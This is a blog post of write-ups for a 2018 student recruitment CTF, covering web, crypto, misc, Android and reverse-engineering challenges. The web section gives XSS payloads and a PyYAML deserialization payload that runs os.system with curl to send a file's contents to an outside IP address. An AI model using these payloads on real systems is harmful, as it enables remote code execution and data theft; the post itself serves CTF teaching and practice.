<main class="main post-page">
    <article class="article-entry">
        <p>紧张刺激的招新赛终于结束了，快来学一波姿势吧。<br><a id="more"></a></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>#####Easy XSS</p>
<p><code>payload:?name=dazhutizi&quot;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code><br><code>得到：flag{- .... . ..-. .. .-. ... - -..- ... ... ..-. .-.. .- --. }</code><br><code>摩斯解密：flag{THEFIRSTXSSFLAG}</code></p>
<p>#####Maybe Difficult XSS</p>
<p><code>payload:?keyword=dazhutizi&quot;&gt;&lt;A HREF=&quot;javascript:alert()&quot;&gt;flag&lt;/a&gt;</code></p>
<p><code>flag{W0w_iS_D1fficu1t_XSS&#39;s_F1ag}</code></p>
<p>#####Easy php</p>
<p>此题要是输入一个符合要求的数字，那么在sleep()的时候需要等上2个月了。is_numeric函数能够处理正常的数字以及十六进制或0x开头的字符串。而(int)处理十六或0x开头的字符串时会返回0。</p>
<p><code>payload1:?TIME=6e6</code></p>
<p><code>payload2:?TIME=0x4f1a00</code></p>
<h5 id="未来chrome"><a href="#未来chrome" class="headerlink" title="未来chrome"></a>未来chrome</h5><p><strong>看到网页</strong></p>
<p><img src="https://github.com/0devil/tupian/raw/957947e0fda95584ca3d55110d85a842b3c449ab/chrome99.png" alt="Aaron Swartz"></p>
<p><strong>很显然应该修改User-Agent</strong></p>
<p>  <img src="https://github.com/0devil/tupian/raw/master/chrome992.png" alt="Aaron Swartz"></p>
<p><strong>得到一串base64编码的字符</strong></p>
<p><img src="https://github.com/0devil/tupian/raw/master/chrome993.png" alt="3"></p>
<p><strong>解码得flag{uauaua_hahaha}</strong></p>
<p><img src="https://github.com/0devil/tupian/raw/master/chrome994.png" alt="2"></p>
<h5 id="F12"><a href="#F12" class="headerlink" title="F12"></a>F12</h5><p><strong>打开网页看到提示直接F12寻找头部</strong></p>
<p><strong>flag{hahahaha_headers}</strong></p>
<p><img src="https://github.com/0devil/tupian/raw/master/f121.png" alt="3"></p>
<h5 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h5><p><strong>F12寻找提示</strong></p>
<p><img src="https://github.com/0devil/tupian/raw/master/bian1.png" alt="5"></p>
<p><strong>打开文件121212.txt</strong></p>
<p><img src="C:\Users\pro4\AppData\Roaming\Typora\typora-user-images\1540464136457.png" alt="7"></p>
<p><strong>进行审计</strong></p>
<p>URL 通过 get 的方式传参，传输的数据以数组的形式被封装在$_GET 中；extract()函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值；isset()函数判断是否存在变量<code>$shiyan</code>;trim()函数移除字符串两侧的空白字符或其他预定义字符 ，这里是移除字符串两侧的空格；file_get_contents()函数将整个文件读入一个字符串；假如<code>$shiyan</code>的值等于文件的内容(<code>$content</code>)时，就打印出flag</p>
<p>解题方法</p>
<p>shiyan=&amp;flag=</p>
<p>得到flag</p>
<p><img src="https://github.com/0devil/tupian/raw/master/bian30.png" alt="0"></p>
<h5 id="简单验证"><a href="#简单验证" class="headerlink" title="简单验证"></a>简单验证</h5><p><img src="https://i.imgur.com/QCuwSgm.png" alt=""></p>
<p>F12控制台查看js，看到alert的链接，打开得到flag图片</p>
<p><img src="https://i.imgur.com/GOifrdG.png" alt=""></p>
<p>猪圈密码，解码得flag为flag{free_mason}</p>
<h5 id="Who-si-he"><a href="#Who-si-he" class="headerlink" title="Who si he"></a>Who si he</h5><p>F12控制台，看到疑似base64的注释</p>
<p><img src="https://i.imgur.com/8MhSQcz.png" alt=""></p>
<p>Base64转图片解码，根据题目who is he？得flag为flag{zeyehongzhi}</p>
<p><img src="https://i.imgur.com/icSTZZ1.png" alt=""></p>
<h5 id="夏风的日记"><a href="#夏风的日记" class="headerlink" title="夏风的日记"></a>夏风的日记</h5><p><img src="https://i.imgur.com/dHEwPgn.png" alt=""></p>
<p>得到密码为ADAIR321321.<br>登陆后得到flag为flag{bugku-shegong_xmq}</p>
<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><p><img src="https://machine123.oss-cn-shenzhen.aliyuncs.com/img/20181026172458.png" alt=""></p>
<p>题目网址内容：</p>
<p><img src="https://machine123.oss-cn-shenzhen.aliyuncs.com/img/20181026172257.png" alt=""></p>
<h5 id="一-背景知识"><a href="#一-背景知识" class="headerlink" title="一 背景知识"></a>一 背景知识</h5><p>​    在勾陈安全实验室的网站<a href="(http://www.polaris-lab.com/index.php/archives/178" title="Python Pickle的任意代码执行漏洞实践和Payload构造)">1</a>上看到一篇文章，文章中讲的Pickle反序列化，而题目中用的是pyyaml模块的反序列化。那么什么是序列化，什么是反序列化呢？</p>
<h6 id="1-1-yaml"><a href="#1-1-yaml" class="headerlink" title="1.1 yaml"></a>1.1 yaml</h6><p>​    yaml和xml、json一样，都是标记类语言，每个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析，其中python里的是pyyaml模块，即是一个yaml库。每个语言的yaml解析器或多或少都会针对这个语言实现一套特殊的对象化规则。</p>
<h6 id="1-2-序列化"><a href="#1-2-序列化" class="headerlink" title="1.2 序列化"></a>1.2 序列化</h6><p>​    序列化是指将数据结构或对象转换成二进制（字节序列）的过程</p>
<p>​    在wp.yaml中写入以下代码：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">date:</span><span class="type">!!str</span> <span class="number">2018</span><span class="bullet">-10</span><span class="bullet">-26</span></span><br><span class="line"><span class="attr">weekday:</span><span class="string">Friday</span></span><br><span class="line"><span class="attr">date1:</span><span class="number">2018</span><span class="bullet">-10</span><span class="bullet">-26</span></span><br></pre></td></tr></table></figure>
<p>​    然后在同一目录下运行如下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">a = yaml.load(file(<span class="string">"wp.yaml"</span>,<span class="string">"r"</span>)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
<p>​    运行后，结果如下：</p>
<p><img src="https://machine123.oss-cn-shenzhen.aliyuncs.com/img/20181026175615.png" alt=""></p>
<p>​    可见，yaml中的语句被序列化</p>
<h6 id="1-3-反序列化"><a href="#1-3-反序列化" class="headerlink" title="1.3 反序列化"></a>1.3 反序列化</h6><p>​    反序列化顾名思义是序列化的逆过程，将在序列化过程中生成的二进制串转换成数据结构或者对象的过程</p>
<h5 id="二-出题思路"><a href="#二-出题思路" class="headerlink" title="二 出题思路"></a>二 出题思路</h5><p>​    从文章<a href="http://www.polaris-lab.com/index.php/archives/375/" title="Python PyYAML反序列化漏洞实验和Payload构造" target="_blank" rel="noopener">2</a>得到信息：</p>
<blockquote>
<p>要实现代码执行，需要序列化和反序列化的内容中出现该编程语言中（Python）的对象（函数、类），因为的对象的反序列化，是在构建一个对象的实例（实例化的过程）。如果一个对象中有函数的定义，有可执行代码，那么实例化后再通过方法调用或者其他的途径才能使其中的代码到执行。普通数据类型的反序列化只是变量相关的初始化、赋值等操作，不会涉及到逻辑处理的代码块，所有不会有代码的执行！（普通数据类型 = 数据，对象= 函数代码+数据）。 </p>
</blockquote>
<p>​    并且其主要导致漏洞的函数是yaml.load()。所以从<a href="https://www.anquanke.com/post/id/86800" title="记CTF比赛中发现的Python反序列化漏洞" target="_blank" rel="noopener">3</a>的wp中得到思路，构造一个上传功能，当用户上传以yaml为后缀或者yml为后缀的文件时，代码中的yaml.load()函数对其进行反序列操作。</p>
<p>​    本题主要使用python2.7+flask1.0.2+PyYaml3.12搭建环境。</p>
<p>​    核心代码如下：</p>
<p><img src="https://machine123.oss-cn-shenzhen.aliyuncs.com/img/20181026181346.png" alt=""></p>
<h5 id="三-解题过程"><a href="#三-解题过程" class="headerlink" title="三 解题过程"></a>三 解题过程</h5><p>​    不断的尝试多种文件，发现有些是合法文件，比如jpg、png、txt等。但在知道这道题是yaml反序列化之后，直接上传一个yaml文件，其中的payload是</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">"hello":</span> <span class="type">!!python</span><span class="string">/object/apply:os.system</span> <span class="string">["curl</span> <span class="attr">http://47.106.105.37/?`cat</span> <span class="string">flag.txt`"]</span></span><br></pre></td></tr></table></figure>
<p>​    在反序列化的过程中执行命令，cat的内容无法直接回显到页面，通过curl，使flag回显到服务器中，其中所给出的ip地址可变，甚至可以回显到本地。在access_log日志信息中可看到flag。</p>
<p><img src="https://machine123.oss-cn-shenzhen.aliyuncs.com/img/20181027012516.png" alt=""></p>
<h5 id="四-复现文件"><a href="#四-复现文件" class="headerlink" title="四 复现文件"></a>四 复现文件</h5><p>​    文件已放在招新群中~~</p>
<p>使用以下命令运行docker</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf_web . #创建镜像，ctf_web是任意取的名字</span><br><span class="line"></span><br><span class="line">docker ps #查看镜像</span><br><span class="line"></span><br><span class="line">docker  run -d ctf_web  </span><br><span class="line"></span><br><span class="line">docker run -d -p 22222:5000 ctf_web #将flask默认的5000端口映射到22222端口</span><br></pre></td></tr></table></figure>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h5 id="onetime-pad"><a href="#onetime-pad" class="headerlink" title="onetime pad :"></a>onetime pad :</h5><p>Attacking A Many Time Pad - Cryptography</p>
<p><a href="https://github.com/Jwomers/many-time-pad-attack" target="_blank" rel="noopener">https://github.com/Jwomers/many-time-pad-attack</a></p>
<pre><code>import string
import collections
import sets, sys
c1=&apos;220900155b09223d3a270a5813260d1a07111a0e3257137a5d&apos;
c2=&apos;08080415083b3f3b3b69030d131f0c00005005027f535d575d&apos;
c3=&apos;15090547342135742b20031113020417545400042d4b434714&apos;
c4=&apos;084c1204132a3d31736927545b17040110111a0f3e46135a09&apos;
c5=&apos;0f1f4113132a703b31251754561c06010d411a0e305c135e18&apos;
c6=&apos;0e0305470f2731207f201d545e13111b115c0f133651525f11&apos;
c7=&apos;461c13080d2a3e742b264e1656520b1c00110d153e51585619&apos;
c8=&apos;031a04155b2636742b210b5458171c531d424e0c3a4247130e&apos;
c9=&apos;05191302576f1c312b69231113190b1c031107017f4b5c465d&apos;
c10=&apos;011e04025b3839203769031113060a5301420b472b5a5a405d&apos;
# c11=&apos;080f131e0b3b393b31691d175b170816545002103e4b401d0c&apos;
ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10]
# The target ciphertext we want to crack
#target_cipher = &quot;0529242a631234122d2b36697f13272c207f2021283a6b0c7908&quot;
# XORs two string
def strxor(a, b):   # xor two strings (trims the longer input)
  return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])
def target_fix(target_cipher):
  # To store the final key
  final_key = [None]*150
  # To store the positions we know are broken
  known_key_positions = set()
  # For each ciphertext
  for current_index, ciphertext in enumerate(ciphers):
    counter = collections.Counter()
    # for each other ciphertext
    for index, ciphertext2 in enumerate(ciphers):
      if current_index != index: # don&apos;t xor a ciphertext with itself
        for indexOfChar, char in enumerate(strxor(ciphertext.decode(&apos;hex&apos;),
ciphertext2.decode(&apos;hex&apos;))): # Xor the two ciphertexts
          # If a character in the xored result is a alphanumeric character,
it means there was probably a space character in one of the plaintexts (we don&apos;t know
which one)
          if char in string.printable and char.isalpha():
counter[indexOfChar] += 1 # Increment the counter at this index
    knownSpaceIndexes = []
    # Loop through all positions where a space character was possible in the
current_index cipher
    for ind, val in counter.items():
      # If a space was found at least 7 times at this index out of the 9 possible
XORS, then the space character was likely from the current_index cipher!
      if val &gt;= 7: knownSpaceIndexes.append(ind)
    #print knownSpaceIndexes # Shows all the positions where we now know the key!
    # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions
we get the key back!
    xor_with_spaces = strxor(ciphertext.decode(&apos;hex&apos;),&apos; &apos;*150)
    for index in knownSpaceIndexes:
      # Store the key&apos;s value at the correct position
      final_key[index] = xor_with_spaces[index].encode(&apos;hex&apos;)
      # Record that we known the key at this position
      known_key_positions.add(index)
  # Construct a hex key from the currently known key, adding in &apos;00&apos; hex chars where
we do not know (to make a complete hex string)
  final_key_hex = &apos;&apos;.join([val if val is not None else &apos;00&apos; for val in final_key])
  # Xor the currently known key with the target cipher
  output = strxor(target_cipher.decode(&apos;hex&apos;),final_key_hex.decode(&apos;hex&apos;))
  print &quot;Fix this sentence:&quot;
  print &apos;&apos;.join([char if index in known_key_positions else &apos;*&apos; for index, char in
enumerate(output)])+&quot;\n&quot;
  # WAIT.. MANUAL STEP HERE
  # This output are printing a * if that character is not known yet
  # fix the missing characters like this: &quot;Let*M**k*ow if *o{*a&quot; = &quot;cure, Let Me know
if you a&quot;
  # if is too hard, change the target_cipher to another one and try again
  # and we have our key to fix the entire text!
  #sys.exit(0) #comment and continue if u got a good key
  target_plaintext = &quot;cure, Let Me know if you a&quot;
  print &quot;Fixed:&quot;
  print target_plaintext+&quot;\n&quot;
  key = strxor(target_cipher.decode(&apos;hex&apos;),target_plaintext)
  print &quot;Decrypted msg:&quot;
  for cipher in ciphers:
    print strxor(cipher.decode(&apos;hex&apos;),key)
  print &quot;\nPrivate key recovered: &quot;+key+&quot;\n&quot;

for i in ciphers:
  target_fix(i)
</code></pre><h4 id="Base全家桶"><a href="#Base全家桶" class="headerlink" title="Base全家桶"></a>Base全家桶</h4><p>直接上脚本<br>​    import base64<br>​    s1=”4C4A575851324332474E324547574B594A563546514D4B4747464D564F4E4C474B4E56454D32435947464A484D56444E4D5134513D3D3D3D”<br>​    s1=base64.b16decode(s1)<br>​    s1=base64.b32decode(s1)<br>​    s1=base64.b64decode(s1)<br>​    print s1</p>
<p><img src="https://i.imgur.com/czWI5Ud.png" alt=""></p>
<p>####多次Base64</p>
<pre><code>import base64
a = open(&apos;base64.txt&apos;)
try:
    b = a.read( )
finally:
    a.close( )
while True:
try:
    b=base64.b64decode(b)
except:
    print b;
    break;
</code></pre><p>flag{base64_base64_base64}</p>
<p>####随机Base64</p>
<pre><code>import base64
f = open(&quot;code.txt&quot;)
file = f.read()
n = &apos;&apos;
steps= []
while True:    
    try:
        n = base64.b16decode(file)
        steps.append(16)
        file = n
        continue
    except:
        pass
    try:
        n = base64.b32decode(file)
        steps.append(32)
        file = n
        continue
    except:
        pass
    try:
        n = base64.b64decode(file)
        steps.append(64)
        file = n
        continue
    except:
        pass
    break

print steps
print n
</code></pre><p>此类脚本可收藏哦</p>
<p><img src="https://i.imgur.com/WbRbaks.png" alt=""></p>
<h4 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h4><p>简单的共模攻击，用python脚本提取n和e。</p>
<p>郁离歌大佬的文章：<a href="https://blog.csdn.net/like98k/article/details/79352076" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/79352076</a></p>
<pre><code>from gmpy2 import invert
def egcd(a, b):
  if a == 0:
    return (b, 0, 1)
  else:
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

def main():
  n = 17362520124149736059291605717839814089431261833972408175766504894876091272021197374480215582589878198406028065354454242540322618614670160317701698407729515781811530180885334265851364490357884909336085410775168953942120359215038925025305363480538685487988827339463890539279008285241711326041868183805848503077373967082910932422798165242481154593794712639251157856102009630894845049984346776659339380886766804814959778048440996937820138560802077375885700500737699904011032451007341777160586467318264288370080315519305800247682611802774996999330812534723806925426052547128371180683265963525581842037399869323246530085399
  c1 = 11757177168629974661319129065020939259607843855964612407515015619551332717303594939284265148421101106538576564879770344246694669035164564635188309876801896156214909946098869029964618647606449218025915092461416329529723153695631060387903820322776063152970417682658882514448192870115306139048632667164375339647480060498038060662339943872320998391726896418231367745182167642401094985859083528539732718585607300300744481583877075988159078923393794888199752412273065186387778708588318818871255432956112609603017152148063465689319082652284861285738454428311471661017770501362483439955249552527930663707069794266908382237863
  c2 = 2364848878397323871885597084235162950454738150033561990125608234733186785294327511676322556989693319543787881108157790541032502889824032246849038028277601291878651138223131738210948288040172974610279550123399373111991951111719314902078119305973622147396199257818150347936553495169543808071509800280778646769553776723985138633331947024508645378935223338224527962766707863670722941767067705851822587652625805245801727869961524972624327839027498877534264770109063202217409037083612774983213841234965045214820133529399280883524064963136158251681946077429913578531311243649928666453318570284124743168193304356485791847813
  e1 = 2333
  e2 = 23333
  s = egcd(e1, e2)
  s1 = s[1]
  s2 = s[2]
  # 求模反元素
  if s1&lt;0:
    s1 = - s1
    c1 = invert(c1, n)
  elif s2&lt;0:
    s2 = - s2
    c2 = invert(c2, n)

  m = pow(c1,s1,n)*pow(c2,s2,n) % n
  print hex(m)[2:].replace(&apos;l&apos;,&apos;&apos;).decode(&apos;hex&apos;)
#  print n2s(m)

if __name__ == &apos;__main__&apos;:
  main()
</code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p>####大鲨鱼</p>
<p><img src="https://i.imgur.com/LbtobF1.png" alt=""></p>
<h4 id="Start-in-the-sky"><a href="#Start-in-the-sky" class="headerlink" title="Start in the sky"></a>Start in the sky</h4><p>emmmmm        没什么好说的，右键属性查看详细信息发现flag。</p>
<p>####暴力破解</p>
<p>使用Zipper爆破，纯数字。得到压缩密码，里面就是flag。</p>
<p>####pg8</p>
<p><img src="https://i.imgur.com/JNCub5r.png" alt=""></p>
<p>####密码给了谁</p>
<p>翻看数据包发现了user得到base64码</p>
<p><img src="https://i.imgur.com/Re3LfxR.png" alt=""></p>
<p>解密得到邮箱，从而得到flag</p>
<p><img src="https://i.imgur.com/Ytf7F77.png" alt=""></p>
<p>####图种</p>
<p>图片另存到桌面，修改后缀名为zip，解压缩得flag.txt<br>flag{C16CD2BCE86CF5824E6C2128E6B636CA}</p>
<p>####音乐里的秘密</p>
<p>音乐另存为本地，用au打开发现摩斯密码，解密<br><img src="https://i.imgur.com/Zw1Smsb.png" alt=""></p>
<p>####crc32</p>
<p>根据所给压缩包crc32爆破，使用工具crc32-master</p>
<p><img src="https://i.imgur.com/KnoQsQg.png" alt=""></p>
<p>寻找合适结果组合得压缩包密码ctf_covteam_com_66</p>
<p>解压得covteam.txt</p>
<p><img src="https://i.imgur.com/brodVh7.png" alt=""></p>
<p>二进制转字符</p>
<p><img src="https://i.imgur.com/PVZ7bXt.png" alt=""></p>
<p>得到一张图的base64，转图片得到一张二维码</p>
<p><img src="https://i.imgur.com/2QyLSQG.png" alt=""></p>
<p>解码得flag{D41D8CD98F00B204E9800998ECF8427E}</p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><p>####easy andriod</p>
<p>在手机上下载下来 随便 输入flag发现输入不能为空和错误的字样</p>
<p><img src="https://i.imgur.com/ViL7dBl.png" alt=""></p>
<p><img src="https://i.imgur.com/sDaRJID.png" alt=""></p>
<p>####秘密</p>
<p><img src="https://i.imgur.com/UASH6RS.png" alt=""></p>
<p>看到Native函数getPass()<br>比较的String来自于这个函数，所以直接逆向.so文件。<br>IDA打开</p>
<p><img src="https://i.imgur.com/OexkgHQ.png" alt=""></p>
<h4 id="这道题只值50分"><a href="#这道题只值50分" class="headerlink" title="这道题只值50分"></a>这道题只值50分</h4><p><img src="https://i.imgur.com/iVUrwNH.png" alt=""></p>
<p><img src="https://i.imgur.com/b7Feza0.png" alt=""></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p><img src="https://i.imgur.com/ILffjwB.png" alt=""></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="RE的入门"><a href="#RE的入门" class="headerlink" title="RE的入门"></a>RE的入门</h4><p>直接拖进IDA中 直接F5</p>
<p><img src="https://i.imgur.com/uRcH1bR.png" alt=""></p>
<p>得到flag</p>
<p>####宣讲会的RE</p>
<p>丢入ida中  找到关键的比较函数，比较的是输入和字符串”232+1”。</p>
<p><img src="https://i.imgur.com/KWeqpac.png" alt=""></p>
<p>####so easy re</p>
<p>解法一：</p>
<p>IDA进去之后会发现字符串{Hacking_for_fun}</p>
<p>后面的操作是将字符串中的i转换为1,r换为1。</p>
<p>所以最后的答案是{Hack1ng_fo1_fun}</p>
<p>解法二</p>
<p>OD载入之后找到关键跳转函数。下断点</p>
<p><img src="https://i.imgur.com/IjJWdZL.png" alt=""></p>
<p>然后执行并输入随意的字符串，长度符合即可。寄存器中可以看到flag。</p>
<p><img src="https://i.imgur.com/Tx4uren.png" alt=""></p>
<p>####Easy Reverse</p>
<p><img src="https://i.imgur.com/H5wxoVk.png" alt=""></p>
<p><img src="https://i.imgur.com/l7uDJnE.png" alt=""></p>
<p>解密脚本</p>
<pre><code>byte_8049AE0 = &quot;lk2j9Gh}AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX{CMt8SZo]U&quot;
byte_8049B15 = [0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,0x69,0x7E,0x33,0x15,0x72,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,0x78,0x78,0x78,0x78,0x1B,0x00,0x00]
flag = &apos;&apos;
for v3 in range(29):
    flag += byte_8049AE0[(byte_8049B15[v3]/3 -2)]
print flag
</code></pre><p>####简单的函数加密</p>
<p>首先PEid查壳</p>
<p><img src="https://i.imgur.com/0LozMQo.png" alt=""></p>
<p>脱壳之后找到关键函数</p>
<p><img src="https://i.imgur.com/nPgUyZd.png" alt=""></p>
<p>写解密脚本</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt; 
char cflag[20]={&apos;1&apos;,&apos;f&apos;,&apos;l&apos;,&apos;R&apos;,&apos;{&apos;,&apos;_&apos;,&apos;_&apos;,&apos;a&apos;,&apos;}&apos;,&apos;_&apos;,&apos;3&apos;,&apos;m&apos;,&apos;a&apos;,&apos;2&apos;,&apos;g&apos;,&apos;3&apos;,&apos;e&apos;}; 
void change(int a,int b);
char flag[18];
void change(int a,int b)
{
    cflag[a]^=cflag[b];
    cflag[b]^=cflag[a];
    cflag[a]^=cflag[b];
}
int main()
{
    change(10,15);
    change(1,15);
    change(2,12);
    change(14,10);
    change(16,8);
    change(0,1);
    change(6,5);
    change(8,11);
    change(3,10);
    change(5,12);
    change(1,5);
    change(0,15);
    printf(&quot;%s&quot;,cflag);
}
</code></pre><p><img src="https://i.imgur.com/vpCJSNF.png" alt=""></p>
<p>生活不易，多才多艺。<br>by Covteam–Sma11-Tim3</p>

    </article>
    <!-- license  -->
    
        <div class="license-wrapper">
            <p>原文作者：<a href="http://yoursite.com">Sma11_Tim3</a>
            </p><p>原文链接：<a href="http://yoursite.com/2018/10/28/2018Covteam招新赛/">http://yoursite.com/2018/10/28/2018Covteam招新赛/</a>
            </p><p>发表日期：<a href="http://yoursite.com/2018/10/28/2018Covteam招新赛/">October 28th 2018, 1:42:44 pm</a>
            </p><p>更新日期：<a href="http://yoursite.com/2018/10/28/2018Covteam招新赛/">October 28th 2018, 3:09:10 pm</a>
            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    
    <!-- paginator  -->
    <ul class="post-paginator">
        <li class="next">
            
                <div class="nextSlogan">Next Post</div>
                <a href="/2018/12/27/拜托教务系统强制评价/" title="拜托教务系统强制评价">
                    <div class="nextTitle">拜托教务系统强制评价</div>
                </a>
            
        </li>
        <li class="previous">
            
                <div class="prevSlogan">Previous Post</div>
                <a href="/2018/10/28/网鼎杯第一场/" title="网鼎杯第一场">
                    <div class="prevTitle">网鼎杯第一场</div>
                </a>
            
        </li>
    </ul>
    <!-- 评论插件 -->
    <!-- 来必力City版安装代码 -->

<!-- City版安装代码已完成 -->
    
    
    <!-- partial('_partial/comment/changyan') -->
    <!--PC版-->


    
    

    <!-- 评论 -->
</main>